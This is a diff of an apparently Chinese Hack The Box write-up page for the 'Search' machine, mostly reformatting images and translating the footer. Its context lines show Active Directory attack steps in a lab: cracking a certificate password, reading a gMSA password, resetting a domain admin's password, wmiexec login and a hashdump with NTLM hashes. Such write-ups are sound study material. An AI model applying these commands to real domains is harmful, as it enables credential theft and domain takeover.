-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012418.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012418.jpg" alt=""></p>
 <h2 id="p12tool"><a href="#p12tool" class="headerlink" title="p12tool"></a>p12tool</h2><ul>
 <li><a href="https://github.com/Ridter/p12tool" target="_blank" rel="noopener">https://github.com/Ridter/p12tool</a></li>
 </ul>
 <p>破解出来密码(比较费时间)：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./p12tool crack -c ../staff.pfx -f ~/Tools/dict/rockyou.txt</span><br><span class="line"></span><br><span class="line">misspissy</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012426.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012426.jpg" alt=""></p>
 <h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><p>导入证书，使用账号密码登录，访问到powershell console：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012419.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012420.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012421.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012419.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012420.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012421.jpg" alt=""></p>
 <h1 id="GMSA"><a href="#GMSA" class="headerlink" title="GMSA"></a>GMSA</h1><p>sierra.frye属于ITSEC组，有权限ReadGMSAPassword</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012422.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012422.jpg" alt=""></p>
 <ul>
 <li><a href="https://github.com/micahvandeusen/gMSADumper" target="_blank" rel="noopener">https://github.com/micahvandeusen/gMSADumper</a></li>
 </ul>
@@ -477,45 +323,17 @@
 </ul>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="string">'BIR-ADFS-GMSA$'</span></span><br><span class="line"><span class="variable">$gmsa</span> = Get-ADServiceAccount -Identity <span class="variable">$user</span> -Properties <span class="string">'msDS-ManagedPassword'</span></span><br><span class="line"><span class="variable">$blob</span> = <span class="variable">$gmsa</span>.<span class="string">'msDS-ManagedPassword'</span></span><br><span class="line"><span class="variable">$mp</span> = ConvertFrom-ADManagedPasswordBlob <span class="variable">$blob</span></span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$user</span>,<span class="variable">$mp</span>.SecureCurrentPassword</span><br><span class="line"><span class="built_in">Invoke-Command</span> -ComputerName localhost -Credential <span class="variable">$cred</span> -ScriptBlock &#123;whoami&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012423.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012423.jpg" alt=""></p>
 <h1 id="Domain-Admin-amp-root-txt"><a href="#Domain-Admin-amp-root-txt" class="headerlink" title="Domain Admin &amp; root.txt"></a>Domain Admin &amp; root.txt</h1><p>BIR-ADFS-GMSA对Tristan.Davies有Generic all权限，而Tristan.Davies是domain admin：</p>
 <p>所以可以直接修改Tristan.Davies的密码后登录</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> -ComputerName localhost -Credential <span class="variable">$cred</span> -ScriptBlock &#123;net user Tristan.Davies miao@<span class="number">1234</span> /domain&#125;</span><br><span class="line"></span><br><span class="line">impacket-wmiexec -dc-ip <span class="number">10.10</span>.<span class="number">11.129</span> search.htb/Tristan.Davies@<span class="number">10.10</span>.<span class="number">11.129</span></span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012424.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012425.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012424.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012425.jpg" alt=""></p>
 <h2 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h2><p>已有shell加载meterpreter，hashdump：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cd69d23e4383daa5b0f42d29dba9529a:::</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012427.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012427.jpg" alt=""></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>Kerberoasting without SPNs – PT SWARM<br><a href="https://swarm.ptsecurity.com/kerberoasting-without-spns/" target="_blank" rel="noopener">https://swarm.ptsecurity.com/kerberoasting-without-spns/</a></li>
 <li><a href="https://github.com/Ridter/p12tool" target="_blank" rel="noopener">https://github.com/Ridter/p12tool</a></li>
@@ -531,7 +349,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2022-05-05T08:31:22.909Z" itemprop="dateUpdated">2022-05-05 16:31:22</time>
+    Last updated: <time datetime="2022-05-05T08:31:22.909Z" itemprop="dateUpdated">2022-05-05 16:31:22</time>
 </span><br>
 
 
@@ -698,11 +516,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
